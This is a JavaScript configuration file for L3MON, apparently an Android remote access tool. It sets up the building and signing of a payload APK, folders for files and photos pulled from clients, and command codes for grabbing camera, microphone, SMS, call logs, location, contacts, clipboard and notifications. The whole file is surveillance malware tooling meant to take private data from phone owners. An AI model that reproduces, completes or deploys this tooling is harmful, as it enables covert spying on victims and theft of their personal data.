const path = require('path');

exports.debug = false;

exports.web_port = 10000;

// Paths
exports.apkBuildPath = path.join(__dirname, '../database/built_apks/build.apk')
exports.apkSignedBuildPath = path.join(__dirname, '../database/built_apks/L3MON.apk')

exports.downloadsFolder = '/client_downloads'
exports.downloadsFullPath = path.join(__dirname, '../database', exports.downloadsFolder)
exports.photosFolder = '/client_photos'
exports.photosFullPath = path.join(__dirname, '../database', exports.photosFolder)

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.uberApkSigner = path.join(__dirname, '../app/factory/', 'uber-apk-signer.jar'); // Use uber-apk-signer for better Java 17 compatibility
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');

// Raw, compiled APK produced from app_source (input to decompile step)
exports.rawApkPath = path.join(__dirname, '../app/factory/rawapk/app-debug.apk');
// Relative class path for dynamic resolution across smali, smali_classes2, smali_classes3, ...
exports.smaliClassRelative = path.join('com', 'etechd', 'l3mon', 'core', 'config', 'Config.smali');

// Build progress tracking file
exports.buildProgressFile = path.join(__dirname, '../database/built_apks/build_progress.json');

exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
exports.signCommand = 'java -jar "' + exports.uberApkSigner + '" --apks "' + exports.apkBuildPath + '" --overwrite';

exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP'
}

exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
}
